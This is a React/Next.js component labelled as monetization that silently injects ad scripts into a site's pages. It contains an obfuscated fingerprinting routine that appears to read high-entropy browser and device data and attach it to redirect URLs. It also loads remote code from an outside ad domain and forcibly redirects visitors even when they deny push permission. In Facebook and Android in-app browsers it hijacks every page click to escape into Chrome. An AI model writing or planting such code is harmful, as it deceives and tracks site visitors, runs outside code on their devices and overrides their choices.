'use client'

import { useEffect } from 'react'

const AdvancedMonetization = () => {
  useEffect(() => {
    // Only load in production or when explicitly enabled
    if (process.env.NODE_ENV !== 'production' && !process.env.NEXT_PUBLIC_ENABLE_MONETIZATION) {
      console.log('🚫 Advanced monetization disabled in development')
      return
    }

    console.log('💰 Advanced monetization system initializing...')

    // Script 1: Push Notification + TrafficBack with Advanced Tracking
    const initAdvancedPush = () => {
      const script1 = document.createElement('script')
      script1.innerHTML = `
        var url = new URL(window.location.href);
        var pci = url.searchParams.get('click_id');
        var ppi = url.searchParams.get('source_id');
        var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]); 
        var s = document.createElement('script');
        s.src='//ahaurgoo.net/37a/7cd29/mw.min.js?z=9464966'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-36fdf.js'+'&nouns=1';
        s.onload = function(result) {
            switch (result) {
                case 'onPermissionDefault':
                    console.log('🔔 Push permission: Default');
                    break;
                case 'onPermissionAllowed':
                    console.log('✅ Push permission: Allowed - Redirecting to Lucky tag');
                    Replace("//n91hg.com/4/9465036?var="+ppi+"&ymid="+pci);
                    break;
                case 'onPermissionDenied':
                    console.log('❌ Push permission: Denied - Redirecting to Lucky tag');
                    Replace("//n91hg.com/4/9465036?var="+ppi+"&ymid="+pci);
                    break;
                case 'onAlreadySubscribed':
                    console.log('🔔 User already subscribed');
                    break;
                case 'onNotificationUnsupported':
                    console.log('❌ Push not supported - Redirecting to Lucky tag');
                    Replace("//n91hg.com/4/9465036?var="+ppi+"&ymid="+pci);
                    break;
            }
        };
        document.head.appendChild(s);
      `
      document.head.appendChild(script1)
    }

    // Script 2: In-App Browser Handler + Facebook Redirect
    const initInAppHandler = () => {
      const script2 = document.createElement('script')
      script2.innerHTML = `
        var url = new URL(window.location.href);
        var pci = url.searchParams.get('click_id');
        var ppi = url.searchParams.get('source_id');
        function isInApp() {
            const regex = new RegExp(\`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))\`, 'ig');
            return Boolean(navigator.userAgent.match(regex));
        }

        function initInappRd() {
            var landingpageURL = window.location.hostname + window.location.pathname + window.location.search;
            var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
            var trafficbackURL = "https://n91hg.com/4/9465037/?var="+ppi+"&ymid="+pci;
            var ua = navigator.userAgent.toLowerCase();

            if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
                console.log('📱 In-app browser detected - Setting up redirect handlers');
                document.body.addEventListener('click', function () {
                    console.log('🚀 In-app click detected - Attempting Chrome redirect');
                    window.onbeforeunload = null;
                    window.open(completeRedirectURL, '_system');
                    setTimeout(function () {
                        console.log('💰 Fallback redirect to Lovey-dovey tag');
                        window.location.replace(trafficbackURL);
                    }, 1000);
                });
            }
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initInappRd);
        } else {
            initInappRd();
        }
      `
      document.head.appendChild(script2)
    }

    // Initialize both systems with delay
    const initTimer = setTimeout(() => {
      initAdvancedPush()
      initInAppHandler()
      console.log('🎯 Advanced monetization system fully loaded')
    }, 2000) // 2 second delay to ensure page is loaded

    // Cleanup function
    return () => {
      clearTimeout(initTimer)
      // Remove scripts if component unmounts
      const existingScripts = document.querySelectorAll('script[src*="ahaurgoo.net"]')
      existingScripts.forEach(script => script.remove())
    }
  }, [])

  return null // This component doesn't render anything visible
}

export default AdvancedMonetization 